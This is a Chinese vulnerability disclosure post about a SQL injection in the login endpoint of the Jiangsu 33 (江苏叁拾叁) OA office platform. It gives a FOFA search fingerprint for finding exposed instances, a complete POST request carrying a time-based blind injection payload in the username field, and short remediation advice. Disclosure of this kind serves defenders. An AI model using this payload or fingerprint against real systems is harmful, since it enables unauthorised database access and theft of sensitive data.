# 原创
：  {大厂漏洞 } OA产品存在SQL注入

# {大厂漏洞 } OA产品存在SQL注入

## **0x01 漏洞介绍**

<br/> 江苏叁拾叁-OA是由江苏叁拾叁信息技术有限公司开发的一款OA办公平台，主要有知识管理，工作流程，沟通交流，辅助办公，集成解决方案，应用支撑平台，基础支撑等功能。 该系统也与江苏叁拾叁智慧农业研究院的农产品电商解决方案、社会化服务解决方案、乡村振兴解决方案等进行了深度融合。该漏洞存在于login下，username对接受的传参没有进行严格的过滤，从而导致SQL注入，攻击者可以利用该漏洞获取数据库敏感信息。

## <br/>**0x02 影响版本**

> 
- `江苏叁拾叁-OA`


## **0x03 语法特征**

> 
- `app="江苏叁拾叁-OA"`


## **0x04 漏洞复现**

<br/> 页面<br/>  

<br/> POC(payload sqlmap梭哈来的)

```
POST /login HTTP/1.1
Host:
Content-Length: 93
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin' AND (SELECT 9415 FROM (SELECT(SLEEP(4)))QBMI) AND 'AUxO'='AUxO&amp;amp;password=admin
```

<br/> 直接sqlmap梭哈来<br/>  

## <br/>**0x05 漏洞修复建议**

> 
- `使用参数化查询`- `对用户输入进行验证和过滤`- `限制数据库账户权限`- `更新和打补丁`

